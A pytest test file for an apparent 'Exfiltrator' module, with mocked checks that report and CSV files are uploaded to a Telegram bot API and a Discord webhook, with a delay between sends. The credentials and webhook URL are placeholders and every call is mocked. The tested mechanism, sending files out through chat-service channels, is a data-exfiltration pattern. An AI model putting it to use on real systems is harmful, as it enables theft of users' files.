import requests
from unittest.mock import patch, MagicMock
from main import Exfiltrator

def test_send_to_telegram(mocker):
    """Test Telegram exfiltration with mocked requests."""
    exf = Exfiltrator(telegram_token="fake_token", telegram_chat_id="fake_id")
    
    mock_post = mocker.patch("requests.post")
    mock_post.return_value.status_code = 200
    
    # Mock open for the file
    mocker.patch("builtins.open", mocker.mock_open(read_data=b"file_content"))
    
    result = exf.send_to_telegram("fake_report.html")
    
    assert result is True
    mock_post.assert_called_once()
    args, kwargs = mock_post.call_args
    assert "telegram.org" in args[0]
    assert kwargs["data"]["chat_id"] == "fake_id"

def test_send_to_discord(mocker):
    """Test Discord exfiltration with mocked requests."""
    exf = Exfiltrator(discord_webhook="https://discord.com/api/webhooks/fake")
    
    mock_post = mocker.patch("requests.post")
    mock_post.return_value.status_code = 204
    
    mocker.patch("builtins.open", mocker.mock_open(read_data=b"file_content"))
    
    result = exf.send_to_discord("fake_report.html")
    
    assert result is True
    mock_post.assert_called_once()
    assert mock_post.call_args[0][0] == "https://discord.com/api/webhooks/fake"

def test_exfiltrator_missing_creds():
    """Test that exfiltration returns False if credentials are missing."""
    exf = Exfiltrator()
    assert exf.send_to_telegram("path") is False
    assert exf.send_to_discord("path") is False

def test_send_files(mocker):
    """Test send_files logic and inter-file delay."""
    exf = Exfiltrator(discord_webhook="https://discord.com/api/webhooks/fake")
    
    mocker.patch("requests.post", return_value=MagicMock(status_code=204))
    mocker.patch("builtins.open", mocker.mock_open(read_data=b"content"))
    
    # Mock time.sleep to avoid waiting during tests
    mock_sleep = mocker.patch("time.sleep")
    
    # Send two files to trigger the delay between them
    exf.send_files(["file1.html", "file2.csv"])
    
    # Check that sleep was called if send_delay > 0
    from main import CONFIG
    if CONFIG["send_delay"] > 0:
        mock_sleep.assert_called_with(CONFIG["send_delay"])
